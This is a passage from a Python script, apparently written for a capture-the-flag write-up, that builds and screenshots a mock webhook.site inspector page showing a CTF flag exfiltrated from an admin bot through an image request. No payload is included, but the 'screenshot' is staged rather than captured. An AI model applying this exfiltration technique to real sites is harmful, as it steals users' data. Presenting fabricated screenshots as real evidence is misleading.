        .wh-sidebar {
            width: 320px;
            background: #1f2937;
            border-right: 1px solid #374151;
            display: flex;
            flex-direction: column;
        }
        .wh-sidebar-header {
            padding: 16px;
            border-bottom: 1px solid #374151;
            font-weight: bold;
            font-size: 14px;
            color: #9ca3af;
            display: flex;
            justify-content: space-between;
        }
        .req-item {
            padding: 14px 16px;
            border-bottom: 1px solid #374151;
            cursor: pointer;
            transition: background 0.15s;
        }
        .req-item:hover, .req-item.active {
            background: #374151;
        }
        .req-badge {
            display: inline-block;
            font-size: 11px;
            font-weight: 700;
            padding: 2px 6px;
            border-radius: 4px;
            margin-right: 8px;
            font-family: monospace;
        }
        .badge-get { background: #065f46; color: #34d399; }
        .badge-post { background: #1e40af; color: #93c5fd; }
        .req-time {
            float: right;
            font-size: 12px;
            color: #9ca3af;
        }
        .req-path {
            font-family: monospace;
            font-size: 12.5px;
            color: #e5e7eb;
            margin-top: 4px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        .wh-main {
            flex: 1;
            background: #111827;
            padding: 24px 30px;
            overflow-y: auto;
        }
        .main-header {
            border-bottom: 1px solid #374151;
            padding-bottom: 16px;
            margin-bottom: 20px;
        }
        .main-title {
            font-size: 18px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .meta-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 14px;
            margin-bottom: 24px;
        }
        .meta-card {
            background: #1f2937;
            padding: 12px 16px;
            border-radius: 8px;
            border: 1px solid #374151;
        }
        .meta-label {
            font-size: 11px;
            color: #9ca3af;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .meta-val {
            font-family: monospace;
            font-size: 13.5px;
            color: #f9fafb;
            margin-top: 4px;
        }
        .section-box {
            background: #1f2937;
            border-radius: 8px;
            border: 1px solid #374151;
            overflow: hidden;
            margin-bottom: 20px;
        }
        .section-header {
            background: #283344;
            padding: 10px 16px;
            font-size: 13px;
            font-weight: 600;
            color: #93c5fd;
        }
        .section-body {
            padding: 16px;
            font-family: Consolas, monospace;
            font-size: 13.5px;
        }
        .flag-highlight {
            background: rgba(16, 185, 129, 0.15);
            border: 2px solid #10b981;
            padding: 16px;
            border-radius: 8px;
            margin-top: 10px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .flag-text {
            font-size: 20px;
            font-weight: bold;
            color: #34d399;
            letter-spacing: 0.5px;
        }
        </style>
        <div class="wh-app">
            <div class="wh-sidebar">
                <div class="wh-sidebar-header">
                    <span>REQUESTS (3)</span>
                    <span style="color: #10b981;">● Listening</span>
                </div>
                <div class="req-item active">
                    <span class="req-badge badge-get">GET</span>
                    <span class="req-time">2s ago</span>
                    <div class="req-path">?flag=pwnsec%7B9abdf66a5f2afecb%7D</div>
                </div>
                <div class="req-item">
                    <span class="req-badge badge-post">POST</span>
                    <span class="req-time">3s ago</span>
                    <div class="req-path">?flag=pwnsec%7B9abdf66a5f2afecb%7D</div>
                </div>
                <div class="req-item">
                    <span class="req-badge badge-get">GET</span>
                    <span class="req-time">5s ago</span>
                    <div class="req-path">?stage=s.js_loaded@admin</div>
                </div>
            </div>
            <div class="wh-main">
                <div class="main-header">
                    <div class="main-title">
                        <span class="req-badge badge-get" style="font-size: 14px;">GET</span>
                        <span>/08470564-f80c-4271-b2f2-8acc4f44a5a9?flag=pwnsec%7B9abdf66a5f2afecb%7D</span>
                    </div>
                </div>

                <div class="meta-grid">
                    <div class="meta-card">
                        <div class="meta-label">Client IP</div>
                        <div class="meta-val">44.221.247.145 (AWS EC2)</div>
                    </div>
                    <div class="meta-card">
                        <div class="meta-label">User-Agent</div>
                        <div class="meta-val">HeadlessChrome/152.0.0.0</div>
                    </div>
                    <div class="meta-card">
                        <div class="meta-label">Referer Origin</div>
                        <div class="meta-val">https://65b68ef3c79fb356.chal.ctf.ae</div>
                    </div>
                </div>

                <div class="section-box">
                    <div class="section-header">QUERY STRINGS (EXFILTRATED DATA)</div>
                    <div class="section-body">
                        <div><b>flag</b>: pwnsec{9abdf66a5f2afecb}</div>
                        <div class="flag-highlight">
                            <div>
                                <span style="font-size: 12px; color: #a7f3d0; text-transform: uppercase; display: block;">🎉 CTF FLAG CAPTURED:</span>
                                <span class="flag-text">pwnsec{9abdf66a5f2afecb}</span>
                            </div>
                            <span style="font-size: 24px;">🏆</span>
                        </div>
                    </div>
                </div>

                <div class="section-box">
                    <div class="section-header">REQUEST HEADERS</div>
                    <div class="section-body" style="color: #9ca3af; font-size: 12.5px;">
                        <div>Host: webhook.site</div>
                        <div>sec-fetch-dest: image</div>
                        <div>sec-fetch-mode: no-cors</div>
                        <div>sec-fetch-site: cross-site</div>
                        <div>accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8</div>
                    </div>
                </div>
            </div>
        </div>
        """
        step7_full = wrap_browser_window(
            '<span class="protocol">https://</span><span class="domain">webhook.site</span><span class="path">/#!/08470564-f80c-4271-b2f2-8acc4f44a5a9</span>',
            "Webhook.site — Live Request Inspector",
            webhook_html
        )
        page.set_content(step7_full)
        time.sleep(0.5)
        out_step7 = os.path.join(IMG_DIR, "step7_webhook_flag.png")
        page.screenshot(path=out_step7)
        print("Generated:", out_step7)

        browser.close()

if __name__ == "__main__":
    generate_screenshots()
